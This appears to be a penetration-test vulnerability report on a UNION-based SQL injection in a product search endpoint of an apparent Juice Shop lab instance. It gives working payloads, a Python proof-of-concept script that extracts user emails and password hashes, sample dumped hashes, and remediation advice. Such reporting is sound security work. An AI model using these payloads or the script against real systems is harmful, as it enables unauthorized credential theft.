# UNION-based SQL Injection in GET /rest/products/search q parameter leaks all user credentials

**ID:** vuln-0017
**Severity:** HIGH
**Found:** 2026-09-11 20:01:59 UTC
**Target:** http://host.docker.internal:3001
**Method:** GET
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

The **`q`** parameter of the product search endpoint is concatenated into a raw SQL query on the backend. A UNION-based payload extracts arbitrary database content; all 28 users' emails and password hashes were dumped unauthenticated.

## Evidence

Baseline versus injected query (only q differs):

```http
GET /rest/products/search?q=juice
-> 200, 35 legitimate product rows, no user data

GET /rest/products/search?q=juice'%20OR%201=1--
-> 500 Error: SQLITE_ERROR: incomplete input (raw parser error)

GET /rest/products/search?q=juice')) UNION SELECT 1,2,3,4,5,6,7,8,9--
-> 200, injected marker row rendered: {"id":11,"name":22,"description":33,...}
```

Credential dump excerpt (28 rows total):

```text
admin@juice-sh.op        0192023a7bbd73250516f069df18b500
accountant@juice-sh.op   963e10f92a70b4b463220cb4c5d636dc
support@juice-sh.op      3869433d74e3d0c86fd25562f836bc82
morty@juice-sh.op        f2f933d0bb0ba057bc8e33b8ebd6d9e8
```

Full-schema extraction also confirmed via `UNION SELECT type,name,1,1,1,1,1,'table',sql FROM sqlite_master` returning CREATE TABLE statements for Users, Cards, Addresses, Wallets, etc.

## Impact

Unauthenticated full-database read access: the entire Users table (emails and MD5 password hashes for all 28 accounts, including the administrator) was extracted, along with the complete database schema via sqlite_master. No authentication or user interaction is required.

## Counterevidence

Control query q=juice returns only legitimate product rows and no credential data, so the leak is caused solely by the injected fragment. Parameterized variants would have returned 404/no rows; instead the injected UNION rows render with attacker-controlled column markers (id=11..99). No WAF or input validation observed on q.

## What Would Change This Severity

If the search query were parameterized server-side, extraction would fail — no other condition materially lowers this; confirmation of stacked-query support would raise it further (write access).

## Technical Analysis

The search handler interpolates the q value into a raw SQL LIKE query on SQLite (the double-paren `'))` prefix indicates the value lands inside a `LIKE('%...%')` nested in the query text). A single quote yields a raw `SQLITE_ERROR: incomplete input` 500 page, proving textual interpolation. The payload `juice')) UNION SELECT 11,22,33,44,55,66,77,88,99--` closes the LIKE, unions a 9-column SELECT matching the Products projection, and comments out the remainder; the SPA's JSON response renders the injected rows, allowing arbitrary table reads. Commas in the URL path fragment trigger an Express catch-all mis-dispatch (search must be sent as a URL-encoded query parameter, not path), which is a routing quirk, not a control. Extracting Users via `SELECT email||password FROM Users` demonstrates credential disclosure; sqlite_master extraction demonstrates full schema enumeration.

## Proof of Concept

1. Send `GET /rest/products/search` with query parameter `q` set to `juice')) UNION SELECT 11,22,33,44,55,66,77,88,99--` and observe an injected marker row rendered in the JSON response.
2. Send the same endpoint with `q` set to `juice')) UNION SELECT type,name,1,1,1,1,1,'table',sql FROM sqlite_master--` to dump the full schema.
3. Send `q` set to `juice')) UNION SELECT email||password,2,3,4,5,6,7,8,9 FROM Users--` to extract every user's email concatenated with their password hash; the credentials appear in the `id` field of the returned JSON rows.
4. Compare with a control request `q=juice` which returns only product rows, confirming the leak is caused by the injected fragment.

```python
#!/usr/bin/env python3
"""PoC: UNION-based SQL injection in GET /rest/products/search?q= (SQLite)."""
import requests

BASE = "http://host.docker.internal:3001"

# 1. Column mapping / injection confirmation
r = requests.get(
    BASE + "/rest/products/search",
    params={"q": "juice')) UNION SELECT 11,22,33,44,55,66,77,88,99--"},
    timeout=15,
)
assert r.status_code == 200
marker = [row for row in r.json()["data"] if row["id"] == 11 and row["name"] == 22]
assert marker, "injection failed"
print("[+] Injection confirmed: attacker-controlled marker row rendered")

# 2. Dump all user credentials (email || password hash)
r = requests.get(
    BASE + "/rest/products/search",
    params={"q": "juice')) UNION SELECT email||password,2,3,4,5,6,7,8,9 FROM Users--"},
    timeout=15,
)
assert r.status_code == 200
creds = [row["id"] for row in r.json()["data"] if isinstance(row["id"], str)]
print(f"[+] Extracted {len(creds)} user credential rows (email||password hash):")
for c in creds[:5]:
    print("   ", c)

# 3. Control: benign query leaks nothing
r = requests.get(BASE + "/rest/products/search", params={"q": "juice"}, timeout=15)
assert all(row["id"] != 11 for row in r.json()["data"])
print("[+] Control query (q=juice) leaks no user data")
```

## Remediation

Replace the raw SQL string concatenation used for search with Sequelize's parameterized query API (bound parameters or a where-clause object), never interpolating the q value into query text. Apply allowlist validation on the search term (e.g. rejecting quotes and SQL metacharacters) only as defense in depth, not as the primary control.

## Assumptions

No privileges or authentication required; endpoint is public. Demo instance — impact scored on the demonstrated class (unauthenticated full credential-table disclosure).
